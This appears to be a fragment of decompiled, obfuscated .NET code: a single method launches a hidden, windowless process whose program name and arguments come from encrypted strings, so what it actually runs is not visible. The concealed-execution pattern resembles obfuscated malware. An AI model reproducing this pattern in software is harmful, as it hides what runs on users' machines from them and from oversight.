using System.Diagnostics;
using ns0;

namespace ns3;

internal class Class8
{
	public static void smethod_0()
	{
		Process process = new Process();
		process.StartInfo.FileName = _003CPrivateImplementationDetails_003E_007B1A79D80D_002D5413_002D4269_002DAB56_002D5064970F91A2_007D.smethod_15();
		process.StartInfo.Arguments = _003CPrivateImplementationDetails_003E_007B1A79D80D_002D5413_002D4269_002DAB56_002D5064970F91A2_007D.smethod_16() + Class12.string_0 + _003CPrivateImplementationDetails_003E_007B1A79D80D_002D5413_002D4269_002DAB56_002D5064970F91A2_007D.smethod_17() + Class12.string_6[0] + _003CPrivateImplementationDetails_003E_007B1A79D80D_002D5413_002D4269_002DAB56_002D5064970F91A2_007D.smethod_18();
		process.StartInfo.UseShellExecute = false;
		process.StartInfo.CreateNoWindow = true;
		process.Start();
		process.WaitForExit();
	}
}
